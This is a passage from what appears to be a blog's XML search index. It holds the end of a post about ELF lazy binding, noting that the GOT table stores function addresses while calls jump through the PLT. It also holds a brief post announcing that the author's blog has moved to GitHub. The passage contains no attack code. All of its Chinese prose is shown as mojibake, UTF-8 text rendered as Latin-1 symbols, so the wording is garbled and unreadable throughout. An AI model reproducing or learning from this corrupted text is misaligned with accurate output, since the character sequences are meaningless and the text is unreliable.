class=""><p>æœ€åæä¸€å˜´ï¼Œ<code>GOT</code>è¡¨åªæ˜¯å­˜æ”¾å‡½æ•°åœ°å€çš„è¡¨è€Œå·²ï¼ŒçœŸæ­£çš„è°ƒç”¨æ˜¯éœ€è¦é€šè¿‡<code>PLT</code>è¡¨æ¥è¿›è¡Œè·³è½¬</p><p>ä¸‹é¢æ˜¯ä¸€ä½å¤§ä½¬ç”»çš„å›¾å°±æ‹¿æ¥ç”¨äº†ï¼š</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5970003-bcf9343191848103.png" class="" title="5970003-bcf9343191848103"><p>å»¶è¿Ÿç»‘å®šå®Œæˆä¹‹åå°±å¯ä»¥ç›´æ¥å»<code>GOT</code>é‡Œé¢æ‹¿çœŸå®çš„å‡½æ•°åœ°å€å•¦ï¼</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5970003-9baedd55881a39dd.png" class="" title="5970003-9baedd55881a39dd">]]></content>
      
      
      
        <tags>
            
            <tag> åº•å±‚çš„å°å•¾å•¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¢¦å¼€å§‹çš„åœ°æ–¹</title>
      <link href="/2020/11/01/%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9/"/>
      <url>/2020/11/01/%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9/</url>
      
        <content type="html"><![CDATA[<p><code>ZYen</code>çš„å°ç«™è‡ªä»Šå¤©èµ·å°±æ­£å¼å¼€å¼ å•¦ï¼ä¹‹å‰ä¹°æœåŠ¡å™¨æ­åšå®¢ä¸å¾—åŠ²ï¼Œç°åœ¨æ­£å¼è½¬ä¸º<code>github</code>è¾½ï¼Œæ–‡ç« çš„æ—¥æœŸå¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œä¸è¿‡æ— ä¼¤å¤§é›…ï¼Œæ„¿è‡ªå·±çƒ­çˆ±çš„äº‹æƒ…æœ€ç»ˆéƒ½èƒ½æœ‰ä¸ªå¥½ç»“æœï¼ï¼ˆæ’’èŠ±âœ¨ï¼‰</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
